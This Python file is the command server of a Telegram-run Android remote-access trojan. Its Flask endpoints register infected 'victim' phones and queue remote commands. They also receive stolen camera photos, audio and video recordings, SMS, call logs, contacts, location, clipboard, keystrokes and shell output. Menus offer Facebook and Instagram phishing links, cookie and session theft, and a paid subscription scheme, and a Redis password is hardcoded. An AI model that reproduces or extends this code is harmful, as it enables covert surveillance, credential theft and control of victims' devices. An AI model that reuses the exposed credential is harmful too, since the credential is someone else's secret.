# main.py
# ============================================================
# DEV 1 — Bot Controller v4
# نظام: ضحايا متعددين + APK واحد لكل ضحية + ربط تلقائي
# ============================================================

import os
import io
import time
import json
import base64
import threading
import requests
import secrets
import telebot
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, jsonify, redirect
import redis
import uuid

# ============================================================
# استيراد الأدوات القديمة (Facebook / Instagram / RAT / QR / LSH / SH)
# ============================================================
try:
    from facebook_module import init_facebook_routes
except Exception as e:
    print(f"[-] facebook_module: {e}")
    init_facebook_routes = lambda app, bot: None

try:
    from instagram_module import init_instagram_routes
except Exception as e:
    print(f"[-] instagram_module: {e}")
    init_instagram_routes = lambda app, bot: None

try:
    from rat_module import init_rat_routes, rat_bp, queue_command
except Exception as e:
    print(f"[-] rat_module: {e}")
    init_rat_routes = lambda app, bot: None
    rat_bp = None
    queue_command = lambda *args: None

try:
    from qr_pairing import init_qr_routes, qr_bp, generate_qr_code_bytes
except Exception as e:
    print(f"[-] qr_pairing: {e}")
    init_qr_routes = lambda app, bot: None
    qr_bp = None
    generate_qr_code_bytes = lambda *args: None

try:
    from lsh_module import (
        init_lsh_routes, lsh_bp,
        generate_qr_code_bytes as lsh_generate_qr,
        set_bot_reference,
        push_command as lsh_push_command,
        get_session as lsh_get_session,
        build_lsh_control_panel,
    )
    LSH_ENABLED = True
except Exception as e:
    print(f"[-] lsh_module: {e}")
    LSH_ENABLED = False
    def init_lsh_routes(app, bot): pass
    def set_bot_reference(bot): pass
    def lsh_push_command(*a, **kw): return False
    def lsh_get_session(*a, **kw): return None
    def lsh_generate_qr(*a, **kw): return io.BytesIO()
    def build_lsh_control_panel(*a, **kw): return InlineKeyboardMarkup()
    lsh_bp = None

try:
    from session_hunter import (
        init_session_hunter_routes, sh_bp, get_sh_data,
        build_sh_panel, SUPPORTED_SITES,
        create_session as sh_create_session,
        generate_login_page as sh_generate_login_page,
    )
    SH_ENABLED = True
    print("[+] session_hunter imported")
except Exception as e:
    print(f"[-] session_hunter: {e}")
    SH_ENABLED = False
    def init_session_hunter_routes(app, bot): pass
    sh_bp = None
    def get_sh_data(sid): return {}
    def build_sh_panel(sid, cid): return InlineKeyboardMarkup()
    SUPPORTED_SITES = {}
    def sh_create_session(*a, **kw): return None
    def sh_generate_login_page(*a, **kw): return "Error"

# ============================================================
# ★★★ نظام الضحايا الجديد ★★★
# ============================================================
try:
    from victims_manager import (
        create_victim, get_victim, get_all_victims, delete_victim,
        update_victim_status, rename_victim,
        find_victim_by_token, register_victim_device,
        add_victim_data, get_victim_data,
        queue_victim_command, pop_victim_commands,
        get_victim_stats,
    )
    VICTIMS_ENABLED = True
    print("[+] victims_manager imported")
except Exception as e:
    print(f"[-] victims_manager: {e}")
    import traceback
    traceback.print_exc()
    VICTIMS_ENABLED = False
    def create_victim(*a, **kw): return None
    def get_victim(*a, **kw): return None
    def get_all_victims(*a, **kw): return []
    def delete_victim(*a, **kw): return False
    def update_victim_status(*a, **kw): return False
    def rename_victim(*a, **kw): return False
    def find_victim_by_token(*a, **kw): return None
    def register_victim_device(*a, **kw): return False
    def add_victim_data(*a, **kw): return False
    def get_victim_data(*a, **kw): return []
    def queue_victim_command(*a, **kw): return False
    def pop_victim_commands(*a, **kw): return []
    def get_victim_stats(*a, **kw): return {}

# ============================================================
# نظام الدفع + الأدمن
# ============================================================
try:
    from stars_payment import (
        register_payment_handlers, get_or_create_user, can_use_tool,
        consume_usage, build_plans_keyboard, build_main_payment_keyboard,
        build_account_text, build_plans_text, send_invoice,
        PRICING_PLANS, FREE_TRIAL_USES, AVAILABLE_TOOLS,
        is_admin, is_vip, get_all_users, get_user, save_user,
        delete_user, ban_user, unban_user, activate_subscription,
        build_admin_menu, build_admin_users_keyboard,
        build_user_detail_keyboard, build_user_info_text,
        build_admin_stats_text, ADMIN_IDS, VIP_IDS,
    )
    PAYMENT_ENABLED = True
    print("[+] stars_payment imported")
except Exception as e:
    print(f"[-] stars_payment: {e}")
    PAYMENT_ENABLED = False
    def register_payment_handlers(bot): pass
    def get_or_create_user(*a, **kw): return {}
    def can_use_tool(*a, **kw): return {"allowed": True, "reason": "bypass"}
    def consume_usage(*a, **kw): return True
    def build_plans_keyboard(): return InlineKeyboardMarkup()
    def build_main_payment_keyboard(): return InlineKeyboardMarkup()
    def build_account_text(*a, **kw): return "نظام الدفع معطّل"
    def build_plans_text(): return "نظام الدفع معطّل"
    def send_invoice(*a, **kw): pass
    PRICING_PLANS = {}
    FREE_TRIAL_USES = 3
    AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh", "apk"]
    def is_admin(uid): return False
    def is_vip(uid): return False
    def get_all_users(): return []
    def get_user(uid): return None
    def save_user(uid, u): return False
    def delete_user(uid): return False
    def ban_user(uid): return False
    def unban_user(uid): return False
    def activate_subscription(uid, pk): return {}
    def build_admin_menu(): return InlineKeyboardMarkup()
    def build_admin_users_keyboard(*a, **kw): return InlineKeyboardMarkup()
    def build_user_detail_keyboard(*a, **kw): return InlineKeyboardMarkup()
    def build_user_info_text(*a, **kw): return ""
    def build_admin_stats_text(): return ""
    ADMIN_IDS = []
    VIP_IDS = []

# ============================================================
# الإعدادات العامة
# ============================================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
PUBLIC_URL = os.getenv("PUBLIC_URL", "https://sec.h42536974.workers.dev")
RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")
RAILWAY_URL = PUBLIC_URL

GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "")
GITHUB_REPO = os.getenv("GITHUB_REPO", "atmemokhtar2-blip/zxvp")
GITHUB_WORKFLOW_FILE = os.getenv("GITHUB_WORKFLOW_FILE", "build.yml")

print(f"[+] Public URL: {PUBLIC_URL}")
print(f"[+] GitHub Repo: {GITHUB_REPO}")
print(f"[+] GitHub Token: {'Set' if GITHUB_TOKEN else 'NOT SET'}")

# ============================================================
# Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "").strip()
if not REDIS_URL:
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://" + REDIS_URL

print(f"[+] Redis URL: {REDIS_URL[:45]}...")


def _try_redis(url):
    try:
        client = redis.Redis.from_url(
            url, decode_responses=True,
            socket_timeout=10, socket_connect_timeout=10,
            retry_on_timeout=True, health_check_interval=30,
        )
        client.ping()
        return client
    except Exception as e:
        print(f"[-] Redis try failed: {e}")
        return None


redis_client = _try_redis(REDIS_URL)

if not redis_client and REDIS_URL.startswith("redis://"):
    tls_url = REDIS_URL.replace("redis://", "rediss://", 1)
    redis_client = _try_redis(tls_url)
    if redis_client:
        REDIS_URL = tls_url
        print("[+] TLS connection succeeded!")

if not redis_client and REDIS_URL.startswith("rediss://"):
    non_tls = REDIS_URL.replace("rediss://", "redis://", 1)
    redis_client = _try_redis(non_tls)
    if redis_client:
        REDIS_URL = non_tls
        print("[+] Non-TLS succeeded!")

if redis_client:
    print("[+] main: Redis connected")
else:
    print("[-] main: Redis FAILED")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN missing!")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ============================================================
# Origin Gate — يسمح لمسارات APK بدون secret
# ============================================================
ORIGIN_SECRET = os.getenv("ORIGIN_SECRET", "a7f3k9x2m5p8q1w4e6r0t3y7u2i5o8s1")
ORIGIN_GATE_EXEMPT = ['/', '/health']


@app.before_request
def verify_origin():
    path = request.path
    if path in ORIGIN_GATE_EXEMPT:
        return None
    if request.method == 'OPTIONS':
        return None
    if path.startswith('/apk/') or path.startswith('/victim/'):
        return None
    secret = request.headers.get('X-Origin-Secret', '')
    if secret == ORIGIN_SECRET:
        return None
    client_ip = (request.headers.get('CF-Connecting-IP') or
                 request.headers.get('X-Forwarded-For') or
                 request.remote_addr)
    print(f"[-] BLOCKED: {path} from {client_ip}")
    return jsonify({"error": "Access denied"}), 403


@app.route('/')
def health_check():
    return "DEV 1 Controller is running.", 200


# ============================================================
# GitHub — بناء APK الضحية
# ============================================================
def trigger_victim_apk_build(victim_token, victim_name):
    if not GITHUB_TOKEN:
        print("[-] GITHUB_TOKEN not set")
        return False
    try:
        url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/workflows/{GITHUB_WORKFLOW_FILE}/dispatches"
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json",
        }
        payload = {
            "ref": "main",
            "inputs": {
                "victim_token": victim_token,
                "victim_name": victim_name,
            }
        }
        r = requests.post(url, headers=headers, json=payload, timeout=15)
        if r.status_code in [204, 200]:
            print(f"[+] Build triggered: {victim_name}")
            return True
        else:
            print(f"[-] Build failed: {r.status_code} - {r.text[:200]}")
            return False
    except Exception as e:
        print(f"[-] trigger error: {e}")
        return False


def get_victim_apk_url(victim_token, max_wait=900):
    if not GITHUB_TOKEN:
        return None
    start = time.time()
    short_token = victim_token[:16]
    print(f"[+] Waiting for APK: {short_token}")
    while time.time() - start < max_wait:
        try:
            url = f"https://api.github.com/repos/{GITHUB_REPO}/releases?per_page=15"
            headers = {
                "Authorization": f"token {GITHUB_TOKEN}",
                "Accept": "application/vnd.github.v3+json",
            }
            r = requests.get(url, headers=headers, timeout=15)
            if r.status_code == 200:
                for release in r.json():
                    name = release.get("name", "")
                    tag = release.get("tag_name", "")
                    if short_token in name or short_token in tag:
                        for asset in release.get("assets", []):
                            if asset.get("name", "").endswith(".apk"):
                                return asset.get("browser_download_url")
        except Exception as e:
            print(f"[-] check error: {e}")
        time.sleep(15)
    return None


# ============================================================
# تسجيل Blueprints
# ============================================================
if rat_bp:
    app.register_blueprint(rat_bp)
if qr_bp:
    app.register_blueprint(qr_bp)
if LSH_ENABLED and lsh_bp:
    app.register_blueprint(lsh_bp)
if SH_ENABLED and sh_bp:
    app.register_blueprint(sh_bp)

init_facebook_routes(app, bot)
init_instagram_routes(app, bot)
init_rat_routes(app, bot)
init_qr_routes(app, bot)
init_lsh_routes(app, bot)
init_session_hunter_routes(app, bot)

if LSH_ENABLED:
    set_bot_reference(bot)

register_payment_handlers(bot)


# ============================================================
# ★★★ API للضحية (Victim APK) ★★★
# ============================================================

@app.route('/apk/victim/register', methods=['POST'])
def victim_register():
    try:
        data = request.get_json(silent=True) or {}
        victim_token = data.get('token', '').strip()

        if not victim_token:
            return jsonify({"error": "missing_token"}), 400

        victim_info = find_victim_by_token(victim_token)
        if not victim_info:
            print(f"[-] Invalid victim_token: {victim_token[:16]}")
            return jsonify({"error": "invalid_token"}), 403

        chat_id = victim_info['chat_id']
        victim_id = victim_info['victim_id']
        victim_name = victim_info.get('name', 'Unknown')

        device_id = data.get('device_id', '')
        model = data.get('model', 'Unknown')
        brand = data.get('brand', 'Unknown')
        android = data.get('android', 'Unknown')
        sdk = data.get('sdk', 0)

        register_victim_device(
            chat_id, victim_id, device_id,
            {"model": model, "brand": brand, "android": android, "sdk": sdk}
        )

        print(f"[+] Victim registered: {victim_name} | {model} | {device_id[:16]}")

        try:
            cid = int(chat_id) if str(chat_id).isdigit() else chat_id
            bot.send_message(
                cid,
                f"✅ **ضحية جديدة متصلة!**\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"👤 **الاسم:** `{victim_name}`\n"
                f"📱 **الموديل:** `{brand} {model}`\n"
                f"🤖 **Android:** `{android}` (SDK {sdk})\n"
                f"🆔 **Device:** `{device_id[:16]}`\n\n"
                f"🎛️ **استخدم:** /panel للتحكم",
                parse_mode="Markdown"
            )
        except Exception as e:
            print(f"[-] notify error: {e}")

        return jsonify({"ok": True, "victim_id": victim_id}), 200
    except Exception as e:
        print(f"[-] register error: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({"error": str(e)}), 500


@app.route('/apk/victim/poll', methods=['GET'])
def victim_poll():
    try:
        victim_token = request.args.get('token', '').strip()
        if not victim_token:
            return jsonify({"commands": []}), 200

        victim_info = find_victim_by_token(victim_token)
        if not victim_info:
            return jsonify({"commands": []}), 200

        victim_id = victim_info['victim_id']
        chat_id = victim_info['chat_id']

        update_victim_status(chat_id, victim_id, "active")

        commands = pop_victim_commands(victim_id, max_count=10)
        if commands:
            print(f"[+] Delivered {len(commands)} commands to {victim_id[:8]}")

        return jsonify({"commands": commands}), 200
    except Exception as e:
        print(f"[-] poll error: {e}")
        return jsonify({"commands": []}), 200


@app.route('/apk/victim/data', methods=['POST'])
def victim_data():
    try:
        data = request.get_json(silent=True) or {}
        victim_token = data.get('token', '').strip()
        dtype = data.get('type', '')

        if not victim_token:
            return jsonify({"status": "no_token"}), 200

        victim_info = find_victim_by_token(victim_token)
        if not victim_info:
            print(f"[-] data from unknown token: {victim_token[:16]}")
            return jsonify({"status": "invalid_token"}), 200

        chat_id = victim_info['chat_id']
        victim_id = victim_info['victim_id']
        victim_name = victim_info.get('name', 'Unknown')

        add_victim_data(victim_id, data)
        update_victim_status(chat_id, victim_id, "active")

        cid = int(chat_id) if str(chat_id).isdigit() else chat_id
        print(f"[<<] {dtype} from {victim_name} ({victim_id[:8]})")

        # ============================================================
        # Camera Photo
        # ============================================================
        if dtype == "camera_photo":
            img_data = data.get('image', '')
            cam_name = data.get('camera_name', '')
            cam_icon = "📷 أمامية" if cam_name == "front" else "📸 خلفية"

            if img_data and img_data.startswith("data:image"):
                try:
                    _, encoded = img_data.split(",", 1)
                    img_bytes = base64.b64decode(encoded)
                    buf = io.BytesIO(img_bytes)
                    buf.name = f"camera_{cam_name}.jpg"
                    bot.send_photo(
                        cid, buf,
                        caption=f"📸 **{cam_icon}**\n"
                                f"👤 `{victim_name}`\n"
                                f"🆔 `{victim_id[:8]}`",
                        parse_mode="Markdown"
                    )
                    print(f"[+] Photo sent to {cid}")
                except Exception as e:
                    bot.send_message(cid, f"❌ صورة فاشلة: {e}")
            else:
                bot.send_message(cid, f"❌ صورة فاضية من {victim_name}")

        # ============================================================
        # Video Record
        # ============================================================
        elif dtype == "video_record":
            video_data = data.get('video', '')
            duration = data.get('duration', 0)
            if video_data and video_data.startswith("data:video"):
                try:
                    _, encoded = video_data.split(",", 1)
                    vid_bytes = base64.b64decode(encoded)
                    buf = io.BytesIO(vid_bytes)
                    buf.name = "record.mp4"
                    bot.send_video(
                        cid, buf,
                        caption=f"🎥 **فيديو {duration/1000:.1f} ثانية**\n"
                                f"👤 `{victim_name}`",
                        parse_mode="Markdown"
                    )
                    print(f"[+] Video sent to {cid}")
                except Exception as e:
                    bot.send_message(cid, f"❌ فيديو فاشل: {e}")

        # ============================================================
        # Audio Record
        # ============================================================
        elif dtype == "audio_record":
            audio_data = data.get('audio', '')
            duration = data.get('duration', 0)
            if audio_data and audio_data.startswith("data:audio"):
                try:
                    _, encoded = audio_data.split(",", 1)
                    aud_bytes = base64.b64decode(encoded)
                    buf = io.BytesIO(aud_bytes)
                    buf.name = "record.3gp"
                    bot.send_audio(
                        cid, buf,
                        caption=f"🎙️ **صوت {duration/1000:.1f} ثانية**\n"
                                f"👤 `{victim_name}`",
                        parse_mode="Markdown"
                    )
                    print(f"[+] Audio sent to {cid}")
                except Exception as e:
                    bot.send_message(cid, f"❌ صوت فاشل: {e}")

        # ============================================================
        # Device Info
        # ============================================================
        elif dtype == "device_info":
            text = (
                f"📱 **معلومات الجهاز**\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"👤 `{victim_name}`\n"
                f"📦 الموديل: `{data.get('model')}`\n"
                f"🏭 الشركة: `{data.get('brand')}`\n"
                f"🤖 Android: `{data.get('android')}`"
            )
            bot.send_message(cid, text, parse_mode="Markdown")

        # ============================================================
        # Battery
        # ============================================================
        elif dtype == "battery":
            level = data.get('level', 0)
            charging = data.get('charging', False)
            text = (
                f"🔋 **البطارية**\n"
                f"👤 `{victim_name}`\n"
                f"📊 `{level}%`\n"
                f"⚡ `{'يشحن' if charging else 'لا يشحن'}`"
            )
            bot.send_message(cid, text, parse_mode="Markdown")

        # ============================================================
        # SMS
        # ============================================================
        elif dtype == "sms":
            sms_list = data.get("sms", [])
            if not sms_list:
                bot.send_message(cid, f"📭 لا رسائل من {victim_name}")
            else:
                lines = [f"📨 **SMS ({len(sms_list)})** — `{victim_name}`", "━" * 20]
                for s in sms_list[:20]:
                    lines.append(f"📩 `{s.get('from')}`:\n{s.get('body','')[:150]}\n───")
                msg = "\n".join(lines)
                for i in range(0, len(msg), 4000):
                    bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")

        # ============================================================
        # Calls
        # ============================================================
        elif dtype == "call_log":
            calls = data.get("calls", [])
            type_map = {"1": "📥", "2": "📤", "3": "❌"}
            lines = [f"📞 **سجل المكالمات** — `{victim_name}`", "━" * 20]
            for c in calls[:25]:
                t = type_map.get(str(c.get('type','')), '❓')
                lines.append(f"{t} `{c.get('number')}` — {c.get('duration')}s")
            bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")

        # ============================================================
        # Contacts
        # ============================================================
        elif dtype == "contacts":
            contacts = data.get("contacts", [])
            lines = [f"👥 **جهات الاتصال ({len(contacts)})** — `{victim_name}`", "━" * 20]
            for c in contacts[:80]:
                lines.append(f"• `{c.get('name')}` — `{c.get('number')}`")
            msg = "\n".join(lines)
            for i in range(0, len(msg), 4000):
                bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")

        # ============================================================
        # Apps
        # ============================================================
        elif dtype == "apps":
            apps = data.get("apps", [])
            lines = [f"📲 **التطبيقات ({len(apps)})** — `{victim_name}`", "━" * 20]
            for a in apps[:80]:
                lines.append(f"• {a.get('name')}")
            msg = "\n".join(lines)
            for i in range(0, len(msg), 4000):
                bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")

        # ============================================================
        # Location
        # ============================================================
        elif dtype == "location":
            lat = data.get("lat")
            lng = data.get("lng")
            if lat and lng:
                bot.send_message(
                    cid,
                    f"📍 **الموقع** — `{victim_name}`\n"
                    f"`{lat}, {lng}`\n"
                    f"[خرائط](https://maps.google.com/?q={lat},{lng})",
                    parse_mode="Markdown"
                )
            else:
                bot.send_message(cid, f"❌ لا يوجد موقع من {victim_name}")

        # ============================================================
        # Clipboard
        # ============================================================
        elif dtype == "clipboard":
            text = data.get("text", "")
            if text:
                bot.send_message(
                    cid,
                    f"📋 **الحافظة** — `{victim_name}`\n```\n{text[:500]}\n```",
                    parse_mode="Markdown"
                )
            else:
                bot.send_message(cid, f"📋 الحافظة فاضية — {victim_name}")

        # ============================================================
        # Photos List
        # ============================================================
        elif dtype == "photos":
            photos = data.get("photos", [])
            lines = [f"🖼️ **الصور ({len(photos)})** — `{victim_name}`"]
            for p in photos[:20]:
                lines.append(f"• `{p.get('path')}`")
            bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")

        # ============================================================
        # Shell
        # ============================================================
        elif dtype == "shell_result":
            cmd = data.get("command", "")
            output = data.get("output", "")
            bot.send_message(
                cid,
                f"💻 **Shell** — `{victim_name}`\n"
                f"`{cmd}`\n```\n{output[:2000]}\n```",
                parse_mode="Markdown"
            )

        # ============================================================
        # Command Result
        # ============================================================
        elif dtype == "cmd_result":
            action = data.get("action", "")
            status = data.get("status", "")
            error = data.get("error", "")
            if status == "fail":
                bot.send_message(
                    cid,
                    f"❌ **فشل أمر على `{victim_name}`**\n"
                    f"الأمر: `{action}`\n"
                    f"السبب: `{error[:200]}`",
                    parse_mode="Markdown"
                )

        # ============================================================
        # Keylog
        # ============================================================
        elif dtype == "keylog":
            text = data.get("text", "")
            if text.strip():
                bot.send_message(
                    cid,
                    f"⌨️ **لوحة مفاتيح** — `{victim_name}`\n"
                    f"```\n{text[:500]}\n```",
                    parse_mode="Markdown"
                )

        elif dtype == "heartbeat":
            pass

        update_victim_status(chat_id, victim_id, "active")

        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"[-] victim_data error: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({"status": "error"}), 200


# ============================================================
# المسار القصير القديم (لسيشن هنتر)
# ============================================================
@app.route('/f/<code>', methods=['GET'])
def short_link_show(code):
    meta = get_short_link(code)
    if not meta:
        return """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><title>رابط منتهي</title>
<style>body{font-family:sans-serif;background:#f5f7fa;text-align:center;padding:80px 20px}
h1{color:#e11d48}</style></head>
<body><h1>❌ الرابط منتهي الصلاحية</h1><p>يرجى طلب رابط جديد</p></body></html>""", 410

    chat_id = str(meta.get("chat_id"))
    site = meta.get("site", "facebook")
    victim_id = meta.get("victim_id", "")
    victim_name = meta.get("name", "")

    session_id = uuid.uuid4().hex[:24]

    if redis_client:
        try:
            redis_client.setex(
                f"sh_session:{session_id}",
                86400 * 7,
                json.dumps({
                    "chat_id": chat_id,
                    "target_site": site,
                    "victim_id": victim_id,
                    "victim_name": victim_name,
                })
            )
        except Exception as e:
            print(f"[-] Redis save session error: {e}")

    if victim_id and VICTIMS_ENABLED:
        try:
            update_victim_status(chat_id, victim_id, "active")
        except Exception:
            pass

    try:
        sh_create_session(session_id, chat_id, site)
    except Exception as e:
        print(f"[-] sh_create_session error: {e}")

    try:
        html = sh_generate_login_page(session_id, chat_id, site)
        return html, 200
    except Exception as e:
        print(f"[-] sh_generate_login_page error: {e}")
        return f"<h1>Error: {e}</h1>", 500


def get_short_link(code):
    if not redis_client:
        return None
    try:
        raw = redis_client.get(f"short:{code}")
        if raw:
            return json.loads(raw)
    except Exception as e:
        print(f"[-] get_short_link error: {e}")
    return None


# ============================================================
# القوائم والأزرار
# ============================================================
def main_menu(user_id=None):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("👥 إدارة الضحايا", callback_data="v_list"))
    markup.add(InlineKeyboardButton("📱 تطبيق الضحية (APK)", callback_data="v_new"))
    markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
    markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
    markup.add(InlineKeyboardButton("📱 أداة المراقبة والتحكم الخلفي", callback_data="gen_rat"))
    markup.add(InlineKeyboardButton("📷 أداة ربط الضحية السريع عبر QR", callback_data="gen_qr"))
    markup.add(InlineKeyboardButton("🕹️ السيطرة الكاملة على الجلسة (LSH)", callback_data="gen_lsh"))
    markup.add(InlineKeyboardButton("🍪 سرقة الكوكيز والجلسات (SH)", callback_data="gen_sh"))
    markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
    markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
    if user_id and is_admin(user_id):
        markup.add(InlineKeyboardButton("👑 لوحة تحكم الأدمن", callback_data="admin_panel"))
    return markup


def victim_commands_panel(victim_id):
    m = InlineKeyboardMarkup()

    # الكاميرا
    m.row(
        InlineKeyboardButton("📷 أمامية", callback_data=f"vcmd_camfront_{victim_id}"),
        InlineKeyboardButton("📸 خلفية", callback_data=f"vcmd_camback_{victim_id}"),
    )
    m.row(InlineKeyboardButton("🎥 فيديو 10s", callback_data=f"vcmd_video_{victim_id}"))

    # الصوت
    m.row(InlineKeyboardButton("🎙️ صوت 10s", callback_data=f"vcmd_audio_{victim_id}"))
    m.row(
        InlineKeyboardButton("🔔 نغمة", callback_data=f"vcmd_sound_{victim_id}"),
        InlineKeyboardButton("🚨 إنذار", callback_data=f"vcmd_alarm_{victim_id}"),
    )

    # البيانات
    m.row(
        InlineKeyboardButton("📱 معلومات", callback_data=f"vcmd_info_{victim_id}"),
        InlineKeyboardButton("🔋 بطارية", callback_data=f"vcmd_battery_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("📨 SMS", callback_data=f"vcmd_sms_{victim_id}"),
        InlineKeyboardButton("📞 المكالمات", callback_data=f"vcmd_calls_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("👥 جهات الاتصال", callback_data=f"vcmd_contacts_{victim_id}"),
        InlineKeyboardButton("📲 التطبيقات", callback_data=f"vcmd_apps_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🖼️ الصور", callback_data=f"vcmd_photos_{victim_id}"),
        InlineKeyboardButton("📍 الموقع", callback_data=f"vcmd_location_{victim_id}"),
    )
    m.row(InlineKeyboardButton("📋 الحافظة", callback_data=f"vcmd_clipboard_{victim_id}"))

    # التحكم
    m.row(
        InlineKeyboardButton("📳 اهتزاز", callback_data=f"vcmd_vibrate_{victim_id}"),
        InlineKeyboardButton("🔊 صوت أقصى", callback_data=f"vcmd_volmax_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("💬 Toast", callback_data=f"vcmd_toast_{victim_id}"),
        InlineKeyboardButton("💻 Shell", callback_data=f"vcmd_shell_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🔒 قفل", callback_data=f"vcmd_lock_{victim_id}"),
        InlineKeyboardButton("🏠 الرئيسية", callback_data=f"vcmd_home_{victim_id}"),
    )

    # إرسال
    m.row(
        InlineKeyboardButton("✉️ إرسال SMS", callback_data=f"vcmd_sendsms_{victim_id}"),
        InlineKeyboardButton("📞 مكالمة", callback_data=f"vcmd_call_{victim_id}"),
    )
    m.row(InlineKeyboardButton("🌐 فتح رابط", callback_data=f"vcmd_url_{victim_id}"))

    # إدارة
    m.row(
        InlineKeyboardButton("🔄 تحديث", callback_data=f"v_refresh_{victim_id}"),
        InlineKeyboardButton("✏️ تغيير الاسم", callback_data=f"v_rename_{victim_id}"),
    )
    m.row(InlineKeyboardButton("🗑️ حذف الضحية", callback_data=f"v_delete_{victim_id}"))
    m.row(InlineKeyboardButton("🔙 رجوع للضحايا", callback_data="v_list"))

    return m


def _deny_message(reason, user_id, tool, data=None):
    data = data or {}
    if reason == "banned":
        return "🚫 **أنت محظور.**"
    if reason == "daily_limit_reached":
        return f"⚠️ **وصلت للحد اليومي** ({data.get('daily_limit', 0)})."
    if reason == "no_credit":
        return (
            "❌ **لا يوجد لديك استخدام متاح.**\n\n"
            f"🎁 حصلت على {FREE_TRIAL_USES} استخدام مجاني.\n"
            "💎 اشترك للاستمرار."
        )
    return "❌ لا يمكن استخدام الأداة."


# ============================================================
# /start
# ============================================================
@bot.message_handler(commands=['start', 'panel'])
def start_command(message):
    print(f"[+] /start from {message.from_user.id}")
    user_name = message.from_user.first_name
    get_or_create_user(message.from_user.id, message.from_user.username or "Unknown", user_name)

    if is_admin(message.from_user.id):
        text = (
            f"👑 **مرحباً أيها الأدمن {user_name}!**\n\n"
            f"⚡ صلاحيات كاملة.\n"
            f"💎 VIP لا نهائي.\n\n"
            f"🎛️ استخدم اللوحة للتحكم."
        )
    else:
        text = (
            f"⚡ **مرحباً {user_name}**\n\n"
            f"🎯 نظام إدارة الضحايا\n\n"
            f"📱 اضغط **إدارة الضحايا** للبدء"
        )

    bot.send_message(message.chat.id, text, parse_mode="Markdown",
                     reply_markup=main_menu(message.from_user.id))


# ============================================================
# Callback Handler الرئيسي
# ============================================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    data = call.data

    # ============================================================
    # ★★★ قائمة الضحايا ★★★
    # ============================================================
    if data == "v_list":
        bot.answer_callback_query(call.id)

        victims = get_all_victims(chat_id)

        m = InlineKeyboardMarkup()
        m.add(InlineKeyboardButton("➕ ضحية جديدة (APK)", callback_data="v_new"))

        if victims:
            m.add(InlineKeyboardButton(
                f"━━━ 📋 ضحاياي ({len(victims)}) ━━━",
                callback_data="noop"
            ))
            for v in victims[:15]:
                vid = v.get("victim_id", "")
                name = v.get("name", "?")[:18]
                status = v.get("status", "pending")
                icon = "🟢" if status == "active" else "⏸️"
                m.add(InlineKeyboardButton(
                    f"{icon} {name}",
                    callback_data=f"v_open_{vid}"
                ))

        text = (
            f"👥 **إدارة الضحايا**\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📊 **العدد:** `{len(victims)}`\n\n"
        )

        if not victims:
            text += "📭 **لا يوجد ضحايا بعد**\n\n💡 اضغط **➕ ضحية جديدة**"
        else:
            text += "👇 اختر ضحية للتحكم بها"

        bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=m)
        return

    # ============================================================
    # ★★★ ضحية جديدة (بناء APK) ★★★
    # ============================================================
    if data == "v_new":
        bot.answer_callback_query(call.id)

        check = can_use_tool(chat_id, "apk")
        if not check["allowed"]:
            bot.send_message(chat_id, "❌ لا يوجد رصيد. اشترك أولاً.",
                             reply_markup=build_main_payment_keyboard())
            return

        consume_usage(chat_id, "apk")

        msg = bot.send_message(
            chat_id,
            "📝 **إضافة ضحية جديدة**\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "أرسل اسم الضحية (مثلاً: `أحمد` أو `محمد - الرياض`)\n\n"
            "⏱️ _لديك 60 ثانية_",
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(msg, victim_name_step)
        return

    # ============================================================
    # فتح ضحية (لوحة الأوامر)
    # ============================================================
    if data.startswith("v_open_"):
        victim_id = data.replace("v_open_", "")
        victim = get_victim(chat_id, victim_id)
        if not victim:
            bot.answer_callback_query(call.id, "❌ غير موجودة", show_alert=True)
            return

        bot.answer_callback_query(call.id)

        name = victim.get("name", "?")
        status = victim.get("status", "pending")
        device_id = victim.get("device_id", "—")
        model = victim.get("model", "—")
        last_seen = victim.get("last_seen")

        status_icon = "🟢 متصل" if status == "active" else "⏸️ في انتظار التثبيت"
        last_str = "—"
        if last_seen:
            try:
                diff = time.time() - float(last_seen)
                if diff < 60:
